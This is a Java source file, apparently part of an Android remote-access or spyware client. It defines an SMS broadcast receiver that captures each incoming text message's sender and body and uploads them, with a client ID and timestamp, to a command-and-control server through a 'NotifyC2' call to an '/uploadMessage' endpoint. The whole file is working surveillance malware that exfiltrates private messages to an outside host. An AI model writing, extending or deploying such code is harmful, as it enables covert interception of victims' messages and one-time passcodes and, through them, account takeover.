package com.ot.grhq.client.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.ot.grhq.client.functionality.Utils;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * SMS notification receiver
 */
public class SMS extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                // Retrieve the SMS messages received.
                Object[] pdus = (Object[]) bundle.get("pdus");

                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdu);

                        String senderNumber = currentMessage.getDisplayOriginatingAddress();
                        String messageBody = currentMessage.getDisplayMessageBody();

                        if (!senderNumber.isEmpty() && !messageBody.isEmpty()) {
                            String formData = "id=" + Utils.clientID(context);
                            formData += "&type=client";
                            formData += "&res=message";
                            formData += "&sender=" + senderNumber;
                            formData += "&content=" + messageBody;
                            formData += "&timestamp=" + System.currentTimeMillis();
                            new NotifyC2(Utils.getC2Address() + "/uploadMessage", formData, result -> {

                            }).execute();
                        }
                    }
                }
            }
        }
    }


}